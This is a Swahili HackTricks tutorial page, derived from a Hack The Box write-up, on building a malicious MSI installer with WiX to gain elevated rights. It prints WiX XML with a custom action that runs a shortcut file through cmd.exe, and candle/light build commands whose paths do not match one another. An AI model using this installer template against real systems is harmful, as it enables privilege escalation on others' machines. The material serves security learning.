<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

# Kuunda MSI ya Nia Mbaya na Kupata Mamlaka ya Mzizi

Uundaji wa programu ya kusakinisha MSI utafanywa kwa kutumia zana za wixtools, haswa [wixtools](http://wixtoolset.org) zitatumiwa. Ni muhimu kutaja kuwa wajenzi wa MSI mbadala walijaribiwa, lakini hawakuwa na mafanikio katika kesi hii maalum.

Ili kuelewa kikamilifu matumizi ya wix MSI, ni vyema kushauriana na [ukurasa huu](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Hapa, unaweza kupata mifano mbalimbali inayoonyesha matumizi ya wix MSI.

Lengo ni kuzalisha MSI ambayo itatekeleza faili ya lnk. Ili kufanikisha hili, msimbo wa XML ufuatao unaweza kutumika ([xml kutoka hapa](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Ni muhimu kuelewa kuwa kipengele cha Package kina sifa kama vile InstallerVersion na Compressed, ambazo zinaelezea toleo la msanidi wa programu na kuonyesha ikiwa pakiti imefanywa kwa njia ya kubana au la, mtawalia.

Mchakato wa uundaji unahusisha kutumia candle.exe, chombo kutoka wixtools, ili kuzalisha wixobject kutoka msi.xml. Amri ifuatayo inapaswa kutekelezwa:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Kwa kuongezea, ni muhimu kutaja kwamba picha imeambatanishwa katika chapisho hili, ambayo inaonyesha amri na matokeo yake. Unaweza kuitazama kwa mwongozo wa kuona.

Zaidi ya hayo, light.exe, chombo kingine kutoka wixtools, kitatumika kuunda faili ya MSI kutoka kwa wixobject. Amri ya kutekelezwa ni kama ifuatavyo:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Kama ilivyokuwa kwa amri iliyotangulia, picha imejumuishwa katika chapisho inayoonyesha amri na matokeo yake.

Tafadhali kumbuka kuwa ingawa muhtasari huu unalenga kutoa habari muhimu, inashauriwa kurejelea chapisho asili kwa maelezo kamili zaidi na maelekezo sahihi.

## Marejeo
* [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
* [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)


<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
